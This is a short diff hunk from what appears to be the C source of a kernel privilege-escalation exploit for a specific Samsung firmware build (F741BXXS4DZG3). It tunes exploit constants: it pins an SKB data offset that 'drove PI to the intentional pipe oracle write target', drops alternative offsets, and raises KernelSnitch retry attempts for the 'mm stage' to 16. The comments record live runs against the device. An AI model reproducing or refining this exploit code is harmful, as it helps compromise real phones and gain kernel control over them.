@@ -28,12 +28,12 @@
 #define P0_KERNEL_PHYS_LOAD 0x80080000ULL
 /*
  * Live on F741BXXS4DZG3 (RWC=42): delta=0 drove PI to the intentional pipe
- * oracle write target (rb_erase @ pipe_base+0x800). Prefer 0 first; remaining
- * candidates stay for A/B via SKB_DELTA_INDEX / SKB_DATA_DELTA= env.
+ * oracle write target. Pin to 0 — rotating candidates burned attempts without
+ * helping mm-stage reliability. Override only via SKB_DATA_DELTA= env.
  */
 #define SKB_DATA_DELTA (0LL)
-#define SKB_DELTA_CANDIDATES \
-  0LL, -0x1000LL, -0xe80LL, -0x800LL, -0x2000LL, -0x80LL, -0x2c0LL
+/* More mm KernelSnitch tries after a successful pipe oracle (was 2 → too few). */
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 16
 
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
